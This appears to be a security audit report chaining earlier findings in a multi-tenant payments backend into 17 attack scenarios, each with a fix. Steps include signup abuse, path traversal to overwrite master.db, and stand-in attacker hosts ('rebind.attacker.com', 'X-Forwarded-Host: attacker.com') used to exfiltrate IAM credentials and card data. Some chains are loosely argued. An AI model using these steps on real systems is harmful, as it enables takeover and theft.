# T30 — Chained-Exploit / Second-Order Analysis

**Auditor:** Claude Sonnet 4.6 (T30 slot)
**Date:** 2026-05-06
**Method:** Read all S01-S36 and T01-T12 findings; identified combinations whose joint impact exceeds either component alone.

---

### [CRITICAL] Chain 1: skipEmailVerification + password_set=0 ATO → mass tenant takeover under victim emails

**Components:** S02-P2-01 (`skipEmailVerification = true`) + S01-P2-01 (`password_set=0` challenge issued before password check)

**Combined exploit:**
1. Attacker POSTs `POST /signup` with `admin_email: victim@company.com` — `skipEmailVerification=true` immediately provisions a full tenant and issues admin JWT to the attacker. No SMTP confirmation needed.
2. The attacker now controls a tenant with `admin.password_set = 1` (set at provisioning). But for any *subsequently created staff accounts* via `POST /settings/users`, those accounts have `password_set = 0`.
3. An attacker who also discovers a staff username on tenant-B (via the ungated `GET /employees` — S09-P2-02) can POST to tenant-B's `/auth/login` with that username and any password string, receive a challenge token (S01-P2-01), and call `POST /auth/login/set-password` to hijack that account entirely.
4. Combined: adversary creates unlimited tenants under victim emails (no email proof), and for each newly discovered `password_set=0` staff member can hijack accounts with zero credential knowledge.

**Combined severity:** CRITICAL — unauthenticated, unlimited, no prior knowledge of passwords required.

**Cheapest break:** Revert `skipEmailVerification` to the env-flag expression (one-line fix in `signup.routes.ts:618`). This eliminates the mass tenant flood before `password_set=0` can be leveraged.

---

### [CRITICAL] Chain 2: `requireStepUpTotpSuperAdmin` wrong column names (500) + impersonation missing step-up → super-admin impersonates any tenant freely

**Components:** S05-P2-01 (`totp_secret` vs `totp_secret_enc` — all step-up routes return 500) + S05-01 (impersonation missing `requireStepUpTotpSuperAdmin`)

**Combined exploit:**
1. S05-P2-01 means every route that *does* require step-up TOTP throws HTTP 500, effectively disabling destructive gates (delete, suspend, plan-change, JWT-rotate, etc.). At first glance this looks like a DoS on operations, not an escalation.
2. However, `POST /tenants/:slug/impersonate` (S05-01) is the *one* destructive super-admin action that was never gated with `requireStepUpTotpSuperAdmin`. It therefore works perfectly while all other step-up routes are broken.
3. A super-admin attacker (or anyone who steals a super-admin JWT within its 30-minute TTL) can call `/impersonate` on every tenant without any TOTP challenge — issuing a 15-minute admin token per tenant, looting all tenant data, while the "correct" guardrails (TOTP) are permanently crashed.

**Combined severity:** CRITICAL — the column-name bug paradoxically makes impersonation *worse*: it's the only escape hatch that remains open while everything else is locked by 500s.

**Cheapest break:** Fix S05-P2-01 first (rename query columns in `stepUpTotp.ts:362`). Once TOTP step-up is functional, S05-01's missing gate can be added normally. Fixing column names is a two-line edit.

---

### [CRITICAL] Chain 3: WS auth skips session revocation + WS token-type confusion → revoked/long-lived credential gives indefinite data access

**Components:** S30-HIGH (WS auth: no session DB lookup) + S30-MEDIUM (no `payload.type==='access'` check) + S06 (transition period: both token types share `JWT_SECRET` fallback)

**Combined exploit:**
1. During the `ACCESS_JWT_SECRET` transition window (before split secrets are set), access and refresh tokens are both signed with `JWT_SECRET`. A refresh token (90-day lifetime) passes WS signature verification (S30-MEDIUM).
2. Even after the transition, a stolen access token (1-hour lifetime) authenticates a WS connection. When the victim logs out (session row deleted), the HTTP layer blocks future requests but the attacker's WS socket continues receiving all tenant broadcasts forever (S30-HIGH).
3. Combining: attacker intercepts a refresh token (e.g., via `/api/v1/auth/refresh` SSRF or shared kiosk cookie). Presents it to WS auth. Socket is accepted with a 90-day effective lifetime. No session check, no token-type check. Victim can never revoke this access without rotating `REFRESH_JWT_SECRET`.

**Combined severity:** CRITICAL — 90-day unrevocable access to all tenant WS broadcasts (tickets, SMS, invoices, customer PII).

**Cheapest break:** Add `payload.type === 'access'` check inside WS auth handler (one-line, S30-MEDIUM). Costs nothing but immediately closes the refresh-token WS entry point. The session revocation check (S30-HIGH) is a harder fix but can follow.

---

### [CRITICAL] Chain 4: db_path not containment-validated + super-admin backup restore → overwrite master.db

**Components:** S08-P2-04 (`db_path` column used in file ops without `startsWith` check) + S05 (super-admin impersonation / backup restore)

**Combined exploit:**
1. A super-admin (or attacker with a hijacked super-admin JWT — possible via S05-01 or S05-P2-02 XSS) sets `tenants.db_path = '../master.db'` via direct DB manipulation or via any SQL-execution path that writes to the master DB.
2. Calls `POST /super-admin/api/tenants/{slug}/backups/{file}/restore`.
3. `backupRestore(tdb, filename, { targetDbPath: path.join(tenantDataDir, '../master.db') })` overwrites `master.db` with an attacker-crafted SQLite file.
4. New `master.db` carries a super-admin row with attacker's own bcrypt hash — permanent super-admin access. All tenants are now compromised.

**Combined severity:** CRITICAL — full platform takeover; persistent access via master credential replacement.

**Cheapest break:** Add `path.resolve(targetDbPath).startsWith(path.resolve(config.tenantDataDir))` assertion before every `backupRestore` call (S08-P2-04 fix). This costs 2 lines and blocks the file-escape regardless of `db_path` value.

---

### [CRITICAL] Chain 5: Invoice payment race (TOCTOU) + loyalty double-earn + `reverseLoyaltyPoints` never called → unbounded loyalty fraud

**Components:** T01-CRITICAL (invoice payment INSERT+SUM+SET not atomic) + S22-HIGH (no UNIQUE on loyalty_points reference) + S22-HIGH (`reverseLoyaltyPoints` exported but never called)

**Combined exploit:**
1. Two concurrent payments on the same invoice both INSERT payment rows (T01). One SUM snapshot may win a race and write `amount_paid = 50` while the invoice should show `amount_paid = 100`.
2. Both payment handlers also call `accruePaymentPoints` — each inserts a loyalty row for the same `(reference_type='invoice', reference_id=N)` with no UNIQUE guard (S22). Customer receives double loyalty points.
3. If the customer then requests a full refund: `reverseLoyaltyPoints` is never invoked (S22). Customer keeps double-earned points AND gets money back.
4. Net: customer pays $100, earns 200 loyalty points (should be 100), gets refunded $100, keeps 200 points. The merchant loses both the money and 200 points of future liability.

**Combined severity:** CRITICAL (financial) — exploitable by any customer with network retry capability; scales with loyalty rate.

**Cheapest break:** Add `UNIQUE(reference_type, reference_id)` partial index on `loyalty_points` and use `INSERT OR IGNORE` in `writeLoyaltyPoints` (S22 fix). This collapses the double-earn regardless of payment race or missing reversal.

---

### [CRITICAL] Chain 6: `/pos/return` unlimited repeat returns + no idempotency + no transaction → arbitrary financial fraud

**Components:** S04-P2-02 / S19-HIGH / T02-HIGH (`/pos/return` no quantity tracking, no idempotency, non-atomic)

**Combined exploit:**
1. A colluding manager calls `POST /pos/return` for line_item_id=5 (qty=1, $500 product) repeatedly. Each call passes `itemQty(1) <= lineItem.quantity(1)` because no previously-returned quantity is tracked.
2. Each call also lacks idempotency middleware, so double-click retries each produce a second credit note independently.
3. The non-atomic execution means a partial crash mid-loop restores stock without creating the credit note — permanent phantom inventory.
4. Combined: a manager with a compromised session (or a colluding insider) can issue N×$500 credit notes for a single sale. With 10 calls: $5000 issued, $5000 stock phantom-restored. No server-side cap.

**Combined severity:** CRITICAL (financial) — requires manager role but that is a low bar (social engineering, stolen session). Direct monetary loss.

**Cheapest break:** Add `idempotent` middleware to `/pos/return` (T02 fix). The idempotency key from the client then de-dupes retries. Also cheaply fixes the double-click vector. The quantity-tracking fix (new DB column) can follow.

---

### [HIGH] Chain 7: Stripe webhook unrate-limited + `subscription.updated` no price validation → fake flood upgrades any tenant to Pro

**Components:** S21-HIGH (no rate limit on `/billing/webhook`) + S21-HIGH (`customer.subscription.updated` upgrades to Pro on any `status=active` without price check)

**Combined exploit:**
1. Attacker learns the webhook URL (`/api/v1/billing/webhook`) — it's a well-known Express mount. No IP allowlist, no rate limit.
2. If the attacker can forge a valid Stripe signature (requires `STRIPE_WEBHOOK_SECRET` — hard, but the endpoint is also a DoS vector without it), OR if an operator accidentally creates a $0 test subscription in the Stripe dashboard, Stripe fires `subscription.updated` with `status=active`.
3. `stripe.ts:897` sets `plan='pro'` for any `status=active` subscription without checking `price.id`. Any active subscription — even a $0 test sub — promotes the tenant to Pro.
4. Even without signature forgery: flooding the endpoint with HMAC compute load (no rate limit) achieves DoS, preventing legitimate subscription events from being processed.

**Combined severity:** HIGH — monetary loss (free Pro upgrades) under insider/test scenario; DoS under external flood.

**Cheapest break:** Add `webhookRateLimit` to the Stripe webhook mount (S21 fix, 1-line change). This blocks the flood vector. The price-ID validation in the switch handler is a separate 3-line fix that should follow.

---

### [HIGH] Chain 8: DNS rebinding on outbound webhooks + SSRF guard uses `assertPublicUrl` not `fetchWithSsrfGuard` → internal service exfiltration via webhook

**Components:** T10-MEDIUM (outbound webhook delivery: SSRF guard run then raw `fetch()` — DNS rebind window) + T10-LOW (`fetchWithSsrfGuard` defined but never called)

**Combined exploit:**
1. An admin configures `webhook_url = http://rebind.attacker.com/` where `rebind.attacker.com` is an attacker TTL=0 server.
2. `assertWebhookUrl` resolves DNS at guard time → attacker returns a public IP (e.g., `1.2.3.4`) → guard passes.
3. Attacker flips DNS to `169.254.169.254` (AWS IMDS) within milliseconds.
4. `fetch(url)` re-resolves DNS via OS → connects to IMDS → receives IAM credentials in response body.
5. The signed event payload (carrying tenant data) is also POSTed to the attacker's next DNS answer (attacker can chain through to exfiltrate event data).

**Combined severity:** HIGH — requires admin role, but yields cloud IAM credential exfiltration + tenant event data leak. On AWS/GCP this is instance-credential takeover → full cloud account compromise.

**Cheapest break:** Replace `assertWebhookUrl` + `fetch` with `fetchWithSsrfGuard` in `webhooks.ts:305` (the function already exists and is correct — it's just never called). This is a 1-line change.

---

### [HIGH] Chain 9: open redirect (Host-header) in payment-link callbackUrl + BlockChyp webhook → exfil card partial data

**Components:** T07-HIGH (`paymentLinks.routes.ts:386`: callback URL built from `X-Forwarded-Host`) + BlockChyp payment webhook delivery

**Combined exploit:**
1. Unauthenticated attacker sends `POST /api/v1/public/payment-links/<valid_token>/pay` with `X-Forwarded-Host: attacker.com`.
2. Server registers `https://attacker.com/…/paid-callback` as the BlockChyp payment-complete hook.
3. When the customer pays, BlockChyp POSTs the transaction receipt — including card last-four, cardholder name, amount, and transaction ID — to `attacker.com`.
4. Attacker also receives the `token` in the URL, enabling them to call the `/paid-callback` path themselves to mark the payment as completed on the server, completing the fraud loop.

**Combined severity:** HIGH — unauthenticated, zero prior knowledge beyond a valid payment-link token. Exfils card partial data and enables payment-status manipulation.

**Cheapest break:** Derive `callbackUrl` from `config.baseDomain` + `req.tenantSlug` instead of `req.headers` (T07 fix, 2-line change in `paymentLinks.routes.ts:386`).

---

### [HIGH] Chain 10: Unicode ZWJ in tenant slug + path string-match containment → cross-tenant DB path confusion

**Components:** T05 (zero-width chars not blocked in `rejectControlAndRTL`) + S08 (asyncDb path constructed from `tenant.slug`)

**Combined exploit:**
1. If a tenant slug containing a ZWJ (U+200D) or ZWSP (U+200B) could be registered — currently blocked by `SLUG_REGEX` which enforces `[a-z0-9-]`, BUT the T05 finding shows that `rejectControlAndRTL` does NOT block ZWJ, and if a custom normalization path ever bypasses `SLUG_REGEX`, the slug enters the DB.
2. `tenantResolver.ts:513` constructs `tenantDbPath = path.join(config.tenantDataDir, \`${tenant.slug}.db\`)`. A slug of `shop‍a` produces a file path `shopZWJa.db`, which on most filesystems is distinct from `shopa.db`. A `startsWith` containment check on the resulting path passes because ZWJ does not produce `..`.
3. Any code that normalizes or strips ZWJ before file lookup would find a different (or non-existent) file, while the raw slug lookup finds the ZWJ file. This creates a split-brain between lookups.
4. More dangerously: if `assertChannelAccess` in `teamChat.routes.ts` receives a channel name `alice‍--bob`, user `alice` (no ZWJ) is denied access while `alice‍` (ZWJ shadow account) gains it.

**Combined severity:** HIGH — requires a slug registration bypass (SLUG_REGEX currently blocks it, so this is a latent chain, not immediately exploitable). Impact if exploited: cross-tenant DB confusion and DM channel ACL bypass.

**Cheapest break:** Add ZWJ, ZWSP, and BOM to `DISALLOWED_TEXT_CODEPOINTS` in `validate.ts` (T05 fix). This is the upstream blocker; the downstream ACL and path issues then cannot be reached via user input.

---

### [HIGH] Chain 11: membership billing cron no overlap guard + double-charge TOCTOU → customers double-billed silently

**Components:** T02-HIGH (membership cron: `trackInterval` no running-guard, concurrent ticks both charge) + T01-HIGH (membership route: duplicate `/:id/run-billing` registration, active handler lacks atomic period-advance guard)

**Combined exploit:**
1. A tenant with 6+ memberships causes `membershipCronBody` to take >1 hour (BlockChyp latency per sub × number of tenants).
2. Second cron tick fires while first is still awaiting `chargeToken()`. Both ticks SELECT `current_period_end <= now()` for the same subscriptions and both pass.
3. Both ticks call `chargeToken()` — customer is billed twice.
4. The manual `POST /:id/run-billing` route doubles this risk: the active handler (the first duplicate registration) lacks the `WHERE current_period_end = <snapshot>` optimistic lock, so a concurrent admin double-click and an overlapping cron tick can both charge simultaneously.

**Combined severity:** HIGH (financial) — affects every customer of every tenant whose cron run exceeds 1 hour. Each double-charge is a real card transaction.

**Cheapest break:** Add an `isRunning` flag to `membershipCronBody` so concurrent ticks skip rather than re-run (T02 fix). This stops the cron-level double-charge. The route-level race (T01) requires the atomic-update fix separately.

---

### [HIGH] Chain 12: `admin.routes.ts` session check conditional on non-null masterDb + revoked super-admin JWT → admin access after logout

**Components:** S06-F-03 (`adminAuth` skips revocation if `masterDb = null`) + S05-P2-01 (TOTP column bug causes 500 on step-up, may indirectly cause DB contention)

**Combined exploit:**
1. Super-admin A is forcibly logged out (session deleted from `super_admin_sessions`).
2. In a brief window where `getMasterDb()` returns `null` (startup race, a DB re-connection after the TOTP column 500-error flood overwhelms the master DB, or a transient connection failure), `adminAuth` in `admin.routes.ts` skips both the session-expiry and `is_active` checks and calls `next()`.
3. Super-admin A's revoked JWT is accepted on `/admin` routes for the duration of the null-DB window.
4. If the TOTP 500 errors (S05-P2-01) cause a stampede of failed requests that lock or exhaust the master DB connection, this window could be minutes.

**Combined severity:** HIGH — revocation bypass for super-admin during an error condition triggered by another bug.

**Cheapest break:** Fix S05-P2-01 (column names) to stop the 500 flood first. Then separately fix `adminAuth` to fail closed on null masterDb (S06-F-03 fix) — return 503, not `next()`.

---

### [HIGH] Chain 13: idempotency memory leak (in-memory map) + WS pool refcount leak → cluster-wide OOM crash

**Components:** S08-P2-01 (tenant pool `releaseTenantDb` never called — refcount leaks → handles accumulate unboundedly) + S08-P2-02 (ReportEmailer cron compounds per-tick) + S30-LOW (WS connections never re-checked after expiry — accumulate in `clientsByTenant` map)

**Combined exploit:**
1. Every HTTP request to any tenant leaks 1 refcount (S08-P2-01). Every 5-minute report cron leaks N refcounts where N = active tenant count (S08-P2-02). Over 24 hours: `24×12×N` = 288N leaked refcounts.
2. Each leaked refcount pins a SQLite DB handle in memory (16 MiB page cache each). 100 tenants × 288 leaks per day = 28,800 phantom handles, each potentially holding memory.
3. Long-lived WS connections (S30-LOW — never re-checked after JWT expiry, no heartbeat TTL) accumulate in `clientsByTenant` and `allClients` maps. Each entry holds a live TCP socket and a reference to the tenant bucket.
4. On a multi-tenant deployment under normal load, this combination produces unbounded memory growth. The Node.js process eventually exhausts heap and crashes with OOM. On restart, all leaked state resets — but the attack is self-reinforcing under sustained traffic.

**Combined severity:** HIGH (availability) — slow-burn DoS over days to weeks of normal operation. No attacker action needed beyond normal usage.

**Cheapest break:** Fix the HTTP-path refcount leak in `tenantResolver` (add `res.on('finish', () => releaseTenantDb(slug))` — S08 Pass 1 fix). This is the highest-volume source. The cron and WS leaks compound more slowly and can be fixed in follow-up.

---

### [HIGH] Chain 14: audit log row UPDATE allowed + master compromise erasure of evidence

**Components:** S05 (master DB `master_audit_log` table — no DELETE/TRUNCATE via API per S05 "verified clean") + S08-P2-04 (`db_path` manipulation → backup restore can overwrite `master.db`)

**Combined exploit:**
1. The S05 "VERIFIED CLEAN" section confirms no API endpoint exposes DELETE on `master_audit_log`. However, S08-P2-04 shows that a super-admin can overwrite `master.db` via backup restore with an attacker-crafted file.
2. A crafted `master.db` can contain a `master_audit_log` table with all adversary actions removed.
3. After the overwrite: the super-admin has erased all evidence of the compromise (impersonations, tenant deletions, plan changes) by replacing the master DB with a clean copy containing only innocent-looking entries.
4. Forensic detection becomes impossible: the backup restore operation itself would normally appear in the audit log, but the restored DB can be crafted without that entry.

**Combined severity:** HIGH — evidence destruction combined with S08-P2-04 exploitation.

**Cheapest break:** Same as Chain 4 — block the `db_path` traversal (S08-P2-04 fix). Without the ability to write arbitrary files, the audit log cannot be overwritten.

---

### [HIGH] Chain 15: Plivo nonce never stored + Twilio MessageSid no dedup → replay of inbound SMS triggers duplicate auto-responses and status manipulation

**Components:** T11-HIGH (Plivo nonce not stored — webhook replayable forever) + T11-MEDIUM (Twilio no timestamp — webhook replayable)

**Combined exploit:**
1. Attacker intercepts one legitimate inbound Plivo or Twilio SMS webhook (e.g., via network sniffing on an unencrypted leg, or a log leak of the full request).
2. Replays the webhook months later. Signature passes (Plivo: nonce not stored; Twilio: no timestamp).
3. The handler inserts a duplicate `sms_messages` row and fires auto-responders (e.g., "Your ticket has been updated" or an opt-out/opt-in keyword handler).
4. Chained with the SMS idempotency gap (T02): `sms_messages` table has no `UNIQUE(provider_message_id)` constraint, so the duplicate INSERT succeeds and the auto-responder fires again.
5. A replay of a `STOP` keyword doubles the opt-out event, creating audit noise. A replay of a payment-confirmation SMS re-triggers any payment-confirmation automation.

**Combined severity:** HIGH — no attacker credentials needed beyond a captured webhook request. Replay enables double-triggering of any SMS automation.

**Cheapest break:** Add `UNIQUE(provider_message_id) WHERE provider_message_id IS NOT NULL` partial index to `sms_messages` and change INSERT to `INSERT OR IGNORE` (T02 fix for inbound SMS). This kills replays at the DB layer regardless of whether the webhook signature check stores nonces.

---

### [MEDIUM] Chain 16: CSRF `/setup` substring bypass + `billing.routes.ts` no role gate → CSRF-triggered subscription action

**Components:** S36-MEDIUM (CSRF guard bypasses any path containing `/setup` substring) + S09-P2-03 (`POST /billing/checkout` and `GET /billing/portal` require no role — any authenticated user)

**Combined exploit:**
1. `req.path.includes('/setup')` exempts `/api/v1/settings/complete-setup` from the content-type CSRF guard.
2. An admin visits a malicious page while logged in. The page submits a form with `Content-Type: application/x-www-form-urlencoded` to `POST /api/v1/billing/checkout` — but `/billing/checkout` does not contain `/setup`, so this specific path is NOT exempt.
3. However, `POST /api/v1/billing/portal` is accessible to ANY authenticated user (S09-P2-03). If an attacker can chain a non-`/setup` path through a CSRF with the right content-type, a cashier victim can be caused to open the Stripe Billing Portal and cancel the subscription.
4. More directly: `/api/v1/settings/complete-setup` is CSRF-exempt via the `/setup` substring. Any admin authenticated user visiting a malicious page while logged in can have a CSRF form submitted to complete-setup, modifying tenant configuration via `application/x-www-form-urlencoded`.

**Combined severity:** MEDIUM — requires victim to be logged in; impact is subscription manipulation or settings corruption.

**Cheapest break:** Use exact path matching instead of `includes('/setup')` in the CSRF guard (S36-MEDIUM fix). This is a 2-line change.

---

### [MEDIUM] Chain 17: per-tenant rate limit on `forgot-password` + `skipEmailVerification` → mass email bombing of any victim address

**Components:** S02-MEDIUM (forgot-password rate limit in tenant DB → multiply by N tenants) + S02-HIGH (`skipEmailVerification=true` → attacker can create N tenants under any email)

**Combined exploit:**
1. Attacker creates N tenants via `POST /signup` with `admin_email: victim@company.com` (enabled by `skipEmailVerification=true`).
2. Each tenant's rate-limit table is independent. From a single IP, attacker POSTs to each tenant's `/forgot-password` endpoint with `victim@company.com` — 3 reset emails per tenant per hour.
3. N=100 tenants × 3 attempts/hour = 300 reset emails/hour to victim from a single IP. With IP rotation, effectively unbounded.
4. Victim's inbox is flooded; legitimate emails may be delayed or quarantined; if victim has 2FA, the per-email confusion from dozens of concurrent reset flows could be exploited for social engineering.

**Combined severity:** MEDIUM — effective email-bomb DoS against any target address. Requires only the signup endpoint (no prior accounts needed).

**Cheapest break:** Same as Chain 1 — fix `skipEmailVerification` (one line). Without arbitrary tenant creation, the per-tenant rate-limit multiplication cannot be exploited.

---

## Summary Table

| # | Severity | Chain Title | Key Components | Cheapest Break |
|---|----------|-------------|---------------|----------------|
| 1 | CRITICAL | Mass tenant flood + `password_set=0` ATO | S02-P2-01 + S01-P2-01 | Fix `skipEmailVerification` (1 line) |
| 2 | CRITICAL | Wrong TOTP columns (500) + impersonation no step-up | S05-P2-01 + S05-01 | Fix column names in `stepUpTotp.ts:362` |
| 3 | CRITICAL | WS skips session check + token-type confusion → 90-day access | S30-HIGH + S30-MEDIUM + S06 | Add `payload.type==='access'` check in WS auth |
| 4 | CRITICAL | `db_path` no containment + backup restore → overwrite master.db | S08-P2-04 + S05 | Add `startsWith` assertion before `backupRestore` |
| 5 | CRITICAL | Invoice payment race + loyalty double-earn + no reversal | T01-CRITICAL + S22-HIGH×2 | Add `UNIQUE` on `loyalty_points(reference_type, reference_id)` |
| 6 | CRITICAL | `/pos/return` no quantity tracking + no idempotency + non-atomic | S04-P2-02 + S19-HIGH + T02-HIGH | Add `idempotent` middleware to `/pos/return` |
| 7 | HIGH | Stripe webhook unrate-limited + no price validation | S21-HIGH×2 | Add `webhookRateLimit` to Stripe webhook mount |
| 8 | HIGH | DNS rebinding on webhooks + `fetchWithSsrfGuard` never called | T10-MEDIUM + T10-LOW | Replace `assertPublicUrl`+`fetch` with `fetchWithSsrfGuard` |
| 9 | HIGH | Host-header injection in payment-link callbackUrl + BlockChyp | T07-HIGH | Derive callbackUrl from `config.baseDomain` |
| 10 | HIGH | Unicode ZWJ in slugs + path/ACL string match | T05-MEDIUM + S08 | Add ZWJ/ZWSP to `DISALLOWED_TEXT_CODEPOINTS` |
| 11 | HIGH | Membership cron no overlap guard + route duplicate + TOCTOU | T02-HIGH + T01-HIGH | Add `isRunning` flag to cron |
| 12 | HIGH | adminAuth null-masterDb skip revocation + TOTP 500 flood | S06-F-03 + S05-P2-01 | Fix TOTP column names first, then fail-closed in adminAuth |
| 13 | HIGH | Pool refcount leak + WS connection accumulation → OOM | S08-P2-01 + S08-P2-02 + S30-LOW | Add `res.on('finish', releaseTenantDb)` in tenantResolver |
| 14 | HIGH | Audit log erasure via backup restore overwrite master.db | S05 + S08-P2-04 | Fix `db_path` containment (same as Chain 4) |
| 15 | HIGH | Plivo nonce not stored + Twilio no timestamp → indefinite SMS replay | T11-HIGH + T11-MEDIUM + T02 | Add `UNIQUE(provider_message_id)` on `sms_messages` |
| 16 | MEDIUM | CSRF `/setup` bypass + billing no role gate | S36-MEDIUM + S09-P2-03 | Use exact paths in CSRF guard (2 lines) |
| 17 | MEDIUM | Per-tenant forgot-password rate limit × N tenants × skipEmailVerification | S02-MEDIUM + S02-P2-01 | Fix `skipEmailVerification` (same as Chain 1) |
